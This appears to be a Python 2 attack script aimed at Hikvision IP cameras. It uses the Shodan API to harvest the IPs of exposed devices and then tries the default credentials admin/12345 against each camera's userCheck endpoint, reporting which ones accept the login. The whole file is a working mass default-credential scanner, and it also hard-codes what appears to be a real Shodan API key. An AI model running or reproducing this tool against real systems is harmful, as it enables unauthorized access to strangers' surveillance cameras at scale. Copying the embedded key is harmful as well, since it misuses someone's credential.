import shodan
import base64
import requests
import optparse

SHODAN_API_KEY="rHRbstt6uayzsIaTe22AQmyLx12bGfx2"
dest_path=r'D:\all_python\hikvision\hikvision.result'
username='admin'
password='12345'
userNamePass=base64.b64encode(username+':'+password)
headers ={
		'Host':'',
		'User-Agent':'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0',
		'Accept':'*/*',
		'Accept-Language':'en;q=0.3',
		'Accept-Encoding':'gzip, deflate',
		'If-Modified-Since':'0',
		'Authorization':'Basic '+userNamePass,
		'X-Requested-with':'XMLHttpRequest',
		'Referer':'',
		'Connection':'keep-alive'
	}
cookies =dict(language='en',updateTips='true')

def my_shodan(SHODAN_API_KEY,dest_path):
	api = shodan.Shodan(SHODAN_API_KEY)
	try:
		results = api.search('hikvision RTSP')
		print 'Results found: %s' % results['total']
		with open(dest_path,'w') as f:
			for result in results['matches']:
				f.write(result['ip_str']+"\n")

	except shodan.APIError, e:
		print 'ERROR: %s' % e
	
def all_scan(dest_path,headers,cookies):
	with open(dest_path,'r') as f:
		for ip in f.readlines():
			try:
				headers['Host']=ip.strip('\n')
				headers['Referer']="http://" + ip.strip('\n')+"/doc/page/login.asp"
				dest_address = "http://"+ ip.strip('\n') +"/PSIA/Custom/SelfExt/userCheck"
				print dest_address
				r = requests.get(dest_address,headers=headers,cookies=cookies,timeout=5)
				if r.status_code == 200:
					print 'ok'
			except requests.exceptions.RequestException, e:
				#raise e
				continue

def one_scan(remote_address,headers,cookies):
	try:
		headers['Host']=remote_address
		headers['Referer']="http://" + remote_address +"/doc/page/login.asp"
		#dest_address = "http://"+ remote_address +"/PSIA/Custom/SelfExt/userCheck"
		#dest_address = "http://admin:12345@" + remote_address +"/ISAPI/Security/userCheck?"
		dest_address = "http://" + remote_address +"/ISAPI/Security/userCheck"
		#dest_address = "http://"+ remote_address
		r = requests.get(dest_address,headers=headers,cookies=cookies,timeout=5)
		if r.status_code == 200:
			print 'ok'
	except requests.exceptions.RequestException, e:
		raise e
		
def main():
	parser = optparse.OptionParser()
	parser.add_option("-r",dest="remote_address",action="store")
	
	(options, args) = parser.parse_args()
	
	if options.remote_address:
		one_scan(options.remote_address,headers,cookies)
	else:
		my_shodan(SHODAN_API_KEY,dest_path)
		all_scan(dest_path,headers,cookies)
	 
if __name__=='__main__':
	main()